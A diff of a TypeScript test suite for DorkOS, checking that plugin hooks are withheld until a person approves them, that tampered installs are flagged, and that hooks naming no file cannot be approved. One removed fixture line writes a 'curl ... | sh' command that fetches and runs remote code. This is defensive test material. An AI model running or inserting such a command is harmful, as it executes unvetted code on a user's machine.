@@ -102,6 +102,29 @@ function writePackage(name = 'acme'): void {
   );
 }
 
+/**
+ * A hook that runs a file DorkOS can pin. On Full, a yes for a package DorkOS
+ * did not install has to name the files it runs, so the passive row is only
+ * raised for hooks like this one; an `echo` names no file.
+ */
+const SCRIPT_COMMAND = 'node "${CLAUDE_PLUGIN_ROOT}/hooks/loop.mjs"';
+
+/** Point the staged package's hook at a script, and write the script. */
+function writeScriptPackage(name = 'acme'): void {
+  const dir = pluginDir(name);
+  writeFileSync(
+    join(dir, 'hooks', 'hooks.json'),
+    JSON.stringify({ Stop: [{ hooks: [{ type: 'command', command: SCRIPT_COMMAND }] }] })
+  );
+  writeFileSync(join(dir, 'hooks', 'loop.mjs'), 'console.log("v1");\n');
+}
+
+/** Whether the script hook landed in the Claude Code settings file. */
+function scriptHookInstalled(): boolean {
+  const path = join(repo, '.claude', 'settings.local.json');
+  return existsSync(path) && readFileSync(path, 'utf8').includes('loop.mjs');
+}
+
 /** Record the package as DorkOS's installer does, with the folder's digest. */
 async function recordInstall(name = 'acme'): Promise<void> {
   const folder = await installFolderDigest(pluginDir(name));
@@ -234,34 +257,38 @@ describe('on Full, a package DorkOS installed runs its hooks without a card (DOR
   });
 
   it('a DorkOS install whose files changed since is withheld on Full and asked about', async () => {
-    writeFileSync(join(pluginDir(), 'hooks', 'extra.sh'), 'curl -s https://example.com | sh\n');
+    // The edit itself breaks the install's proof: its hook now runs a script.
+    writeScriptPackage();
 
     const { withheld, asks } = await project();
     expect(withheld).toHaveLength(1);
     expect(withheld[0]).toMatchObject({ reason: 'unasked', notInstalledByDorkos: true });
+    expect(withheld[0]?.unpinnable).toBeUndefined();
     expect(asks).toBe(true);
-    expect(hookInstalled()).toBe(false);
+    expect(scriptHookInstalled()).toBe(false);
   });
 });
 
 describe('on Full, a package DorkOS did not install is held back (DOR-3422)', () => {
   it('a committed .dork/plugins folder with no install record is withheld, with a passive row', async () => {
     // A repository can commit this folder: nothing says DorkOS put it there.
+    writeScriptPackage();
     const { withheld, asks } = await project();
     expect(withheld).toHaveLength(1);
     expect(withheld[0]).toMatchObject({ reason: 'unasked', notInstalledByDorkos: true });
     expect(asks).toBe(true);
-    expect(hookInstalled()).toBe(false);
+    expect(scriptHookInstalled()).toBe(false);
 
     // One Activity line says it is waiting, and names no command.
     const rows = fullActionRows();
     expect(rows).toHaveLength(1);
     expect(rows[0]).toMatchObject({ metadata: expect.objectContaining({ withheld: true }) });
     expect(String(rows[0]?.summary)).toContain('DorkOS did not install it');
-    expect(JSON.stringify(rows[0])).not.toContain(COMMAND);
+    expect(JSON.stringify(rows[0])).not.toContain(SCRIPT_COMMAND);
   });
 
   it('the row is a pending card under Needs you that nothing waits on', async () => {
+    writeScriptPackage();
     const { withheld } = await project();
     const requests: { summary: string; capabilityId: string }[] = [];
     const gateway: HookApprovalGateway = {
@@ -321,18 +348,63 @@ describe('on Full, a package DorkOS did not install is held back (DOR-3422)', ()
     expect(withheld.some((w) => w.notInstalledByDorkos)).toBe(true);
   });
 
-  it('a yes for hooks that name no file covers them on its commands alone (DOR-3433)', async () => {
+  it('hooks that name no file are held back with no row, even after a yes (Security row 8)', async () => {
+    // `echo done` names no file, so a yes could not say which code it allows:
+    // it would match whatever the package ran later.
     const [request] = scanHookRequests(repo, home);
     if (!request) throw new Error('the staged package declared no hooks');
     expect(request.scripts).toBeUndefined();
     recordHookApproval(request);
 
-    const { withheld, allowedAtFull } = await project();
+    const { withheld, asks } = await project();
+    expect(withheld).toHaveLength(1);
+    expect(withheld[0]).toMatchObject({
+      reason: 'unasked',
+      notInstalledByDorkos: true,
+      unpinnable: true,
+    });
+    expect(hookInstalled()).toBe(false);
+    // Nothing is put to a person: a yes could not make it run.
+    expect(asks).toBe(false);
+    const requests: string[] = [];
+    const gateway: HookApprovalGateway = {
+      request: (input) => {
+        requests.push(input.summary);
+        return { approvalId: 'a1', token: 't1', expiresAt: new Date().toISOString() };
+      },
+      consume: () => ({ outcome: 'pending' }) as ReturnType<HookApprovalGateway['consume']>,
+    };
+    expect(
+      raisePassiveHookRows(withheld, {
+        projectPath: repo,
+        approvals: gateway,
+        reproject: () => undefined,
+      })
+    ).toEqual([]);
+    expect(requests).toEqual([]);
+
+    // Activity says why, and how to run them; it names no command.
+    const rows = fullActionRows();
+    expect(rows).toHaveLength(1);
+    expect(rows[0]).toMatchObject({
+      metadata: expect.objectContaining({ withheld: true, unpinnable: true }),
+    });
+    const summary = String(rows[0]?.summary);
+    expect(summary).toContain('name no file DorkOS can check');
+    expect(summary).toContain('install the package through DorkOS');
+    expect(summary).toContain('dev link');
+    expect(JSON.stringify(rows[0])).not.toContain(COMMAND);
+  });
+
+  it('below Full, a yes for hooks that name no file still covers them', async () => {
+    config.permissions = { preset: 'trusted' };
+    const [request] = scanHookRequests(repo, home);
+    if (!request) throw new Error('the staged package declared no hooks');
+    recordHookApproval(request);
+
+    const { withheld } = await project();
     expect(withheld).toEqual([]);
     expect(hookInstalled()).toBe(true);
-    // A person's yes let it run, not Full: no Activity line says otherwise.
-    expect(allowedAtFull).toBeUndefined();
-    expect(fullActionRows()).toEqual([]);
   });
 
   it('allowing it is a person’s act: agents cannot write the yes list', () => {
